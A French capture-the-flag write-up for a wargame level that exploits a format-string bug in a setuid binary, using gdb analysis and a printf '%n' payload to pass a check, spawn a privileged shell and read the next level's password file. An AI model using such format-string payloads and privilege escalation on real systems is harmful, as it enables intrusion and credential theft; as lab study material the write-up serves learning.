## Comportement
- J'ai des droits `level3` que je peux vérifier en tapant `whoami`
- Un binaire est présent avec des droits différents : `-rwsr-s---+ 1 level4 users  5366 Mar  6  2016 level3*`
- En exécutant le binaire (`./level3`), on observe:
  - qu'il attend un input de notre part.
  - qu'il print notre input avant de quitter.
  - il ne segfault pas meme si l'input est long.


## Analyse
En analysant le binaire (`gdb ./level3`) on observe:
- La présence d'une fonction `v()` avec un appel a `fgets()`: cette fonction est securisee, voila pourquoi le programme ne segfault pas. 
  ```shell
  (gdb) disas v
  ...
  0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
  ...
  ```
- On compare une variable globale situee a l'adresse `0x804988c` avec la valeur `0x40` (64 en hexadécimal). Si les deux valeurs sont egales le programme ouvrira un shell avec la fonction `system()`.
  ```shell
  (gdb) disas v
  ...
  0x080484da <+54>:	mov    0x804988c,%eax
  0x080484df <+59>:	cmp    $0x40,%eax
  ...
  0x08048513 <+111>:	call   0x80483c0 <system@plt>
  ...
  ```
- Utilisation de `printf()`. Peut etre sujet a faille si mal utilise : par exemple `printf("hello")` est vulnerable alors que `print("%s", "hello")` ne l'est pas. La raison : dans la premiere version, un utilisateur peut y inscrire ce qui sera interprete par printf comme des instructions (`%s`) et il ira chercher dans la stack un parametre qui n'existe pas et nous donnera un beau segfault. Voila notre porte d'entree. Bingo Bounga ! 
```shell
echo "%s" | ./level3
Segmentation fault (core dumped)
```


## Résolution
- Avec "%x", `printf()` imprime l'adresse. Nous pouvons ainsi voir l'etat de la stack.
  ```shell
  $ echo "%x %x %x %x" | ./level3
  200 b7fd1ac0 b7ff37d0 25207825
  ```
- Nous devons voir à quelle adresse notre buffer se trouve. On teste avec "BBBB" ("42424242"). On le voit a la 4eme position.
  ```shell
  $ echo "BBBB %x %x %x %x %x %x" | ./level3
  BBBB 200 b7fd1ac0 b7ff37d0 42424242 20782520 25207825
  ```
- Maintenant, nous devons changer cette adresse par celle de la `m` (`0x804988c`) que nous voulons overflow.
  ```shell
  $ python -c 'print "\x8c\x98\x04\x08" + "%x %x %x %x"' | ./level3
  �200 b7fd1ac0 b7ff37d0 804988c
  ```
- En utilisant le modificateur "%n" au lieu de "%x" on ecrit une adresse au lieu de l'afficher. "%n" écrit dans l'adresse le nombre d'octets précédents.On peut specifier l'adresse ainsi `%[number]$n option`.
```shell
$ python -c 'print "\x8c\x98\x04\x08" + "%4$n"' | ./level3
```
- Maintenant, nous devons écrire un offset de 64 bytes dans "m" pour passer la condition. Il suffit donc d'ajouter 60 octets de plus au 4 bytes de l'adresse de `m`.
```shell
python -c 'print "\x8c\x98\x04\x08"+ "B" * 60 + "%4$n"' > /tmp/payload
```
- On couple l'envoi du payload avec le trick qui permet a stdin de rester open (`- |`).
  ```shell
  cat /tmp/payload - | ./level3
  �BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
  Wait what?!
  ```
- Un shell s'ouvre avec de nouveaux privilèges : en effet, si l'on tape `whoami`, on obtient `level4`.
- Il ne reste plus qu'à :
  - récupérer le password (`cat /home/user/level4/.pass`)
  - quitter le shell (`exit`)
  - et passer au level4 (`su level4`) en renseignant ce password.
